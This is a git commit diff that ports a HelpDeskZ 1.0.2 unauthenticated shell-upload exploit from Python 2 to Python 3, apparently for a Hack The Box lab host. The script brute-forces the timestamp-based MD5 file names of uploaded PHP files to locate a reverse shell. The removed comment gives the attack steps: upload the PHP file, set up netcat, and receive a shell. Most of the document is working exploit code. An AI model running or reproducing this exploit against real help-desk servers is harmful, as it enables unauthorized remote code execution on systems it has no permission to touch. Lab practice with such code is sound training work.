2284fc01a5e1a71410aca53b70c7163e00b9ca75
Pablo Martínez Rivas <106752230+pmartinezrhub@users.noreply.github.com>
2026-02-12 19:13:54 +0100

    Update helpdeskz.py
    first commit

--- helpdeskz.py
+++ helpdeskz.py
@@ -1,48 +1,33 @@
-#!/bin/python
-#This is a modified version of https://www.exploit-db.com/raw/40300
-#Since the sysntax on time calculation is incorect
-'''
-The default configuration of this software allows for php files  to be uploaded
+#!/usr/bin/env python3
 
-Steps to reproduce
-
-Fill out a ticket form and attach a php file, solve the captcha and upload,
-(the application will display 'File is not allowed' but the file is still uploaded!!
-
-Set up a netcat session to catch the reverse shell
-
-Run this script and receive a reverse shell back!!!
-
-'''
 import hashlib
-import time, calendar
+import time
+import calendar
 import sys
 import requests
 
-print 'HelpDesk v1.0.2 - Unauthenticated shell upload'
+print("HelpDesk v1.0.2 - Unauthenticated shell upload")
 
 if len(sys.argv) < 3:
-    print "Usage: {} http://helpdeskz.com/support/uploads/tickets/ Reverse-shell.php".format(sys.argv[0])
+    print("Usage: {} http://helpdeskz.com/support/uploads/tickets/ Reverse-shell.php".format(sys.argv[0]))
     sys.exit(1)
-
 
 helpdeskzBaseUrl = sys.argv[1]
 fileName = sys.argv[2]
 
-#Getting the Time from the server
-response = requests.head('http://10.10.10.121/support/')
+response = requests.head('http://help.htb/support/')
 serverTime = response.headers['Date']
-#setting the time in Epoch
+
 FormatTime = '%a, %d %b %Y %H:%M:%S %Z'
 currentTime = int(calendar.timegm(time.strptime(serverTime, FormatTime)))
 
-
-for x in range(0,300):
-    plaintext = fileName + str(currentTime -x)
-    md5hash = hashlib.md5(plaintext).hexdigest()
-
+for x in range(0, 300):
+    plaintext = fileName + str(currentTime - x)
+    md5hash = hashlib.md5(plaintext.encode()).hexdigest()
     url = helpdeskzBaseUrl + md5hash + '.php'
+    #print(url) uncomment for debug
     response = requests.head(url)
+    
     if response.status_code == 200:
         print("found!")
         print(url)
